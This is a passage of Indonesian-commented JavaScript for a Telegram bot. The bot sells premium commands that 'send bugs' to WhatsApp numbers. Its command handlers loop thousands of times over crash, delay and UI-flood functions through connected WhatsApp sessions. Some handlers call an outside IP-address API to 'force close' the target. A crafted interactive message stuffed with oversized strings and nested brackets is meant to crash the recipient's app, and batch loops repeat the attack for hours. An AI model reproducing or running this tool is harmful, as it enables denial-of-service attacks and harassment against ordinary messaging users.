    console.error("Gagal menyimpan ke settings.json:", err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat menyimpan pengaturan.');
  }
});


bot.onText(/^\/setcd$/, (msg) => {
  bot.sendMessage(msg.chat.id, '❗️Example: /setcd 60');
});


//command crasher
bot.onText(/\/XDelvis(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /holedelay 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
      //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendVideo("https://files.catbox.moe/bxk4qv.mp4", {
      caption: `
<b></blockquote>#- S E N D I N G  B U G - 6 6 6</blockquote></b>
<i>- 𝘋𝘢𝘵𝘦 : ${dateTime()}
- 𝘚𝘦𝘯𝘥𝘦𝘳 : @${msg.from.username}
- 𝘔𝘦𝘵𝘩𝘰𝘥𝘦𝘴 : /XDelvis
- 𝘛𝘢𝘳𝘨𝘦𝘵 : ${formattedNumber}</i>

<b><i><blockquote>душ 💎</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀.</blockquote></i></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
              url: `https://wa.me/${formattedNumber}` // Direct link to the jid's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickdelay(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("DELAY ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/Quiksilver(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const q = match[1];

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⛔ Fitur hanya untuk premium.");
  }

  if (!q) {
    return bot.sendMessage(chatId, "Example: /force-nosender 628xxxx", {
      parse_mode: "Markdown"
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const apiUrl = `http://152.42.182.93:2008/dzee?type=fc&chatId=${encodeURIComponent(target)}`;

  const baseCaption = (progress) => `•━━━━━━━━━━━━━━━━━━━━•
〣 Target 
• ☇ ${q}
• ☇ ${progress}
•━━━━━━━━━━━━━━━━━━━━•`;

  const opts = {
    caption: baseCaption("Proses 0%"),
    parse_mode: "Markdown",
    reply_to_message_id: msg.message_id,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "「 Developer 」", url: "https://t.me/Rezuly1" }
        ]
      ]
    }
  };

  // Kirim video
  const videoPath = "./Linuxhere.mp4";
  const sent = await bot.sendVideo(chatId, fs.createReadStream(videoPath), opts);

  // Progress loading
  const messageId = sent.message_id;
  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 500));
    await bot.editMessageCaption(baseCaption(`Proses ${i}%`), {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
          { text: "「 Developer 」", url: "https://t.me/Rezuly1" }
          ]
        ]
      }
    });
  }

  // Kirim permintaan ke API
  try {
    for (let i = 0; i < 5; i++) {
      await new Promise(res => setTimeout(res, 3000));
      await axios.get(apiUrl);
    }

    // Update caption setelah sukses
    await bot.editMessageCaption(baseCaption("Sucses send fcvisible"), {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「 Chek Target 」", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await bot.editMessageCaption(`❌ Failed to send force.\n\n${err.message}`, {
      chat_id: chatId,
      message_id: messageId
    });
  }
});

bot.onText(/\/xploit(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const q = match[1];

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⛔ Fitur hanya untuk premium.");
  }

  if (!q) {
    return bot.sendMessage(chatId, "Example: /delay-nosender 628xxxx", {
      parse_mode: "Markdown"
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const apiUrl = `
http://152.42.182.93:2008/dzee?type=delay&chatId=${encodeURIComponent(target)}`;

  const baseCaption = (progress) => `•━━━━━━━━━━━━━━━━━━━━•
〣 Target 
• ☇ ${q}
• ☇ ${progress}
•━━━━━━━━━━━━━━━━━━━━•`;

  const opts = {
    caption: baseCaption("Proses 0%"),
    parse_mode: "Markdown",
    reply_to_message_id: msg.message_id,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "「 Developer 」", url: "https://t.me/Rezuly1" }
        ]
      ]
    }
  };

  // Kirim video
  const videoPath = "./Linuxhere.mp4";
  const sent = await bot.sendVideo(chatId, fs.createReadStream(videoPath), opts);

  // Progress loading
  const messageId = sent.message_id;
  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 500));
    await bot.editMessageCaption(baseCaption(`Proses ${i}%`), {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
          { text: "「 Developer 」", url: "https://t.me/Rezuly1" }
          ]
        ]
      }
    });
  }

  // Kirim permintaan ke API
  try {
    for (let i = 0; i < 5; i++) {
      await new Promise(res => setTimeout(res, 3000));
      await axios.get(apiUrl);
    }

    // Update caption setelah sukses
    await bot.editMessageCaption(baseCaption("Sucses send fcvisible"), {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「 Chek Target 」", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await bot.editMessageCaption(`❌ Failed to send force.\n\n${err.message}`, {
      chat_id: chatId,
      message_id: messageId
    });
  }
});

bot.onText(/\/zanroto(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /zanroto 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendVideo(chatId, "https://d.uguu.se/KUiRjeMD.jpg", {
      caption: `
<b><blockquote>#- S E N D I N G  B U G </blockquote></b>
<i>- 𝘋𝘢𝘵𝘦 : ${dateTime()}
- 𝘚𝘦𝘯𝘥𝘦𝘳 : @${msg.from.username}
- 𝘔𝘦𝘵𝘩𝘰𝘥𝘦𝘴 : /XTrash 
- 𝘛𝘢𝘳𝘨𝘦𝘵 : ${formattedNumber}</i>

<b><i><blockquote>душ 💎</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀.</blockquote></i></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
              url: `https://wa.me/${formattedNumber}` // Direct link to the jid's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickproto(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error(" ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});


bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /holeios 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
      caption: `
<b><blockquote>#- S E N D I N G  B U G </blockquote></b>
<i>- 𝘋𝘢𝘵𝘦 : ${dateTime()}
- 𝘚𝘦𝘯𝘥𝘦𝘳 : @${msg.from.username}
- 𝘔𝘦𝘵𝘩𝘰𝘥𝘦𝘴 : /Chatms 
- 𝘛𝘢𝘳𝘨𝘦𝘵 : ${formattedNumber}</i>

<b><i><blockquote>душ 💎</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀.</blockquote></i></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
              url: `https://wa.me/${formattedNumber}` // Direct link to the jid's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickui(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/quote(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /quote 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
      caption: `
<b><blockquote>#- S E N D I N G  B U G - </blockquote></b>
<i>- 𝘋𝘢𝘵𝘦 : ${dateTime()}
- 𝘚𝘦𝘯𝘥𝘦𝘳 : @${msg.from.username}
- 𝘔𝘦𝘵𝘩𝘰𝘥𝘦𝘴 : /quote
- 𝘛𝘢𝘳𝘨𝘦𝘵 : ${formattedNumber}</i>

<b><i><blockquote>душ 💎</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀.</blockquote></i></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
              url: `https://wa.me/${formattedNumber}` // Direct link to the jid's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await trasher(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/Douwes(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /delayx 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
      caption: `
<b><blockquote>#- S E N D I N G  B U G - </blockquote></b>
<i>- 𝘋𝘢𝘵𝘦 : ${dateTime()}
- 𝘚𝘦𝘯𝘥𝘦𝘳 : @${msg.from.username}
- 𝘔𝘦𝘵𝘩𝘰𝘥𝘦𝘴 : /Douwes!
- 𝘛𝘢𝘳𝘨𝘦𝘵 : ${formattedNumber}</i>

<b><i><blockquote>душ 💎</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀.</blockquote></i></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
              url: `https://wa.me/${formattedNumber}` // Direct link to the jid's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await multi(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error(" ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
// =========================
// DEPLOY BOT COMMAND
// =========================
// command /deploy <token> <ownerId>
bot.onText(/^\/deploy(?:\s+(\S+)\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    if (!isOwner(userId) && !isSupervip(userId)) {
      return await bot.sendMessage(chatId, "❌ Maaf, Anda tidak memiliki izin untuk menggunakan perintah ini.");
    }

    if (!match || !match[1] || !match[2]) {
      return await bot.sendMessage(chatId, "Gunakan format:\n`/deploy <token> <ownerId>`", { parse_mode: "Markdown" });
    }

    const token = match[1];
    const ownerId = match[2];

    // jalankan deploy
    await deployBot(msg, token, ownerId);
  } catch (error) {
    console.error("Error in deploy command:", error);
    await bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat memproses deploy bot.");
  }
});

// command /listdeploy
bot.onText(/^\/listdeploy$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return await bot.sendMessage(chatId, "❌ Maaf, Anda tidak memiliki izin untuk menggunakan perintah ini.");
    }

    const bots = getBotList();
    if (!bots.length) return await bot.sendMessage(chatId, "📭 Tidak ada bot yang sedang berjalan.");

    let message = `╔══════════════════════╗\n║   LIST TELEGRAM BOTS  ║\n╠══════════════════════╣\n`;
    bots.forEach((b, i) => {
      message += `║ ◈ Bot ${i + 1}\n║ • ID: <code>${b.botId}</code>\n║ • Owner: <code>${b.ownerId}</code>\n║ • PID: ${b.pid || "N/A"}\n╠══════════════════════╣\n`;
    });
    message += `║ Total Bot: ${bots.length}\n╚══════════════════════╝`;

    await bot.sendMessage(chatId, message, { parse_mode: "HTML" });
  } catch (error) {
    console.error("Error in listdeploy command:", error);
    await bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengambil daftar bot.");
  }
});

// command /startdeploy -> coba jalankan semua bot yang tercatat (lagi)
bot.onText(/^\/startdeploy$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return await bot.sendMessage(chatId, "❌ Maaf, Anda tidak memiliki izin untuk menggunakan perintah ini.");
    }

    const bots = getBotList();
    if (!bots.length) return await bot.sendMessage(chatId, "📭 Tidak ada bot yang tercatat.");

    await bot.sendMessage(chatId, `⏳ Memulai ${bots.length} bot dari daftar...`);

    const results = [];
    for (const b of bots) {
      try {
        // pastikan dir masih ada
        if (!fs.existsSync(b.dir)) {
          results.push({ botId: b.botId, ok: false, reason: "Direktori tidak ditemukan" });
          continue;
        }

        const nodeProc = spawn(process.execPath, ["index.js"], {
          cwd: b.dir,
          detached: true,
          stdio: "ignore",
          env: { ...process.env }
        });
        nodeProc.unref();

        // update entry
        saveBotListEntry({ ...b, pid: nodeProc.pid, startedAt: Date.now() });

        results.push({ botId: b.botId, ok: true, pid: nodeProc.pid });
      } catch (err) {
        console.error("startdeploy error for", b.botId, err);
        results.push({ botId: b.botId, ok: false, reason: err.message });
      }
    }

    // buat ringkasan
    const okCount = results.filter(r => r.ok).length;
    await bot.sendMessage(chatId, `✅ Selesai. ${okCount}/${bots.length} bot berhasil dijalankan kembali.`, { parse_mode: "HTML" });
  } catch (error) {
    console.error("Error in startdeploy command:", error);
    await bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat menjalankan bot.");
  }
});

// !! [ COMBO FUNCTION SECTION ] !!



async function funtionnama(durationHours, X) {
              const totalDurationMs = durationHours * 60 * 60 * 1000;
                const startTime = Date.now();
                let count = 0;
                let batch = 1;
                const maxBatches = 5;

              const sendNext = async () => {
                if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
                console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
                return;
                }

              try {
                if (count < 500) {
                await Promise.all([
                instantcrash(X)
                
              ]);
                console.log(chalk.red(`
┌────────────────────────┐
│ ${count + 1}/500 𝐅𝐜 𝐁𝐞𝐭𝐚 📟
└────────────────────────┘
 `));
                count++;
                setTimeout(sendNext, 1000);
              } else {
                console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
              if (batch < maxBatches) {
                console.log(chalk.yellow(`(  𝐃𝐎𝐍𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🍂 𝟔𝟔𝟔 ).`));
                count = 0;
                batch++;
                setTimeout(sendNext, 5 * 60 * 1000);
              } else {
                console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
              }
              }
              } catch (error) {
              console.error(`❌ Error saat mengirim: ${error.message}`);
              setTimeout(sendNext, 700);
                    }
              };
              sendNext();
              }		            
		            
 async function GetSuZoXAndros(durationHours, X) {
              const totalDurationMs = durationHours * 60 * 60 * 1000;
                const startTime = Date.now();
                let count = 0;
                let batch = 1;
                const maxBatches = 5;

              const sendNext = async () => {
                if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
                console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
                return;
                }

              try {
                if (count < 300) {
                await Promise.all([
                StickerMassageNew(X),
                OldDelayButtonNull(X)
              ]);
                console.log(chalk.red(`
┌────────────────────────┐
│ ${count + 1}/300 AndrosDelay 📟
└────────────────────────┘
 `));
                count++;
                setTimeout(sendNext, 800);
              } else {
                console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
              if (batch < maxBatches) {
                console.log(chalk.yellow(`( 𝐃𝐎𝐍𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🍂 𝟔𝟔𝟔 ).`));
                count = 0;
                batch++;
                setTimeout(sendNext, 5 * 60 * 1000);
              } else {
                console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
              }
              }
              } catch (error) {
              console.error(`❌ Error saat mengirim: ${error.message}`);
              setTimeout(sendNext, 500);
                    }
              };
              sendNext();
              }		            
		            
		            
 async function GetSuZoXIOS(durationHours, X) {
              const totalDurationMs = durationHours * 60 * 60 * 1000;
                const startTime = Date.now();
                let count = 0;
                let batch = 1;
                const maxBatches = 5;

              const sendNext = async () => {
                if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
                console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
                return;
                }

              try {
                if (count < 400) {
                await Promise.all([
                iNvsExTendIos(X),
                InVsSwIphone(X)
              ]);
                console.log(chalk.red(`
┌────────────────────────┐
│ ${count + 1}/400 IOS 🍏
└────────────────────────┘
 `));
                count++;
                setTimeout(sendNext, 700);
              } else {
                console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
              if (batch < maxBatches) {
                console.log(chalk.yellow(`(  𝐃𝐎𝐍𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🍂 𝟔𝟔𝟔 ).`));
                count = 0;
                batch++;
                setTimeout(sendNext, 5 * 60 * 1000);
              } else {
                console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
              }
              }
              } catch (error) {
              console.error(`❌ Error saat mengirim: ${error.message}`);
              setTimeout(sendNext, 500);
                    }
              };
              sendNext();
              }
              
//--------------------------( Bug Funcation )-------------------------- \\
              
              const {
		        	CrLxTrava
                     } = require("./𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧/Celieter/1.js")
		      const {
			        LagHomeTravas
		            } = require("./𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧/Celieter/2.js")
	       	  const {
			        AndroTrava
		             } = require("./𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧/Celieter/3.js")
		      const {
			        IpHoneTrash
		            } = require('./𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧/Celieter/4.js')
		      const {
		            ExTndHome
		            } = require("./𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧/Celieter/5.js")
		      const {
			        TeLapeTra
		            } = require("./𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧/Celieter/6.js")
const interactiveCall = async (X) => {
   let msg = await generateWAMessageFromContent(X, proto.Message.fromObject({
      interactiveMessage: {
         body: {
            text: `t.me/Rezuly1/${"ꦾ".repeat(300000)}`,
         },
         nativeFlowMessage: {
            buttons: [{
               name: 'single_select',
               buttonParamsJson: ''
            }, {
               name: "call_permission_request",
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }],
            messageParamsJson: '['.repeat(20000)
         },
         contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "LINUX HERE" }]
         }
      }
   }), {
      userJid: X,
      quoted: null
   });
   await sock.relayMessage(X, msg.message, {
      participant: {
         jid: X
      }
   });
};
//COME ON 




// jid itu jid tau bisa pake x
// sock itu nomer bot
//ku kasih contoh carpas func nya gitu di bawah 

//delay func
async function sickdelay(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING DELAY ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`DELAY SEND TO ${jid}`));

    await safeExec("bulldozer5GB", () => bulldozer2GB(sock, jid));
    await safeExec("Lolipop5Gb"), () => Lolipop5Gb(sock, jid);
  }

  console.log(`Selesai DELAY ke ${jid} oleh ${sock.user.id}`);
}


//Crash function
async function sickproto(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING Crash ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`CRASH SEND TO ${jid}`));

    await safeExec("December"), () => December(jid);
    await safeExec("copyright"), () => copyright(jid);
  }

  console.log(`Selesai CRASH ke ${jid} oleh ${sock.user.id}`);
}


//ui function
async function sickui(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING UI ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`UI SENDING TO ${jid}`));
    await safeExec("UiFloods"), () => UiFloods(jid);
    await safeExec("aphophisChatms"), () => aphophisChatms(jid);
  }

  console.log(`Selesai UI ke ${jid} oleh ${sock.user.id}`);
}

//Bg function
async function trasher(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING BUG${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`BUG SENDING TO ${jid}`));
    await safeExec("DelateForceEmpire"), () => DelateForceEmpire(jid);
  }


  console.log(`BUG Selesai Mengirim ke ${jid} oleh ${sock.user.id}`);
}

//MULTI
async function multi(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING MULTI${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`MULTI SENDING TO ${jid}`));
    await safeExec("x"), () => funtionnama(24, jid);
  }


  console.log(`Multi Selesai Mengirim ke ${jid} oleh ${sock.user.id}`);
}

// Utility untuk eksekusi aman !! JANGAN DI GANTI KALO GA NGERTI !!
async function safeExec(label, func) {
  try {
    await func();
  } catch (err) {
    console.error(`Error saat ${label}:`, err.message);
  }
}

// Delay helper !! JANGAN DI HAPUS !!
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}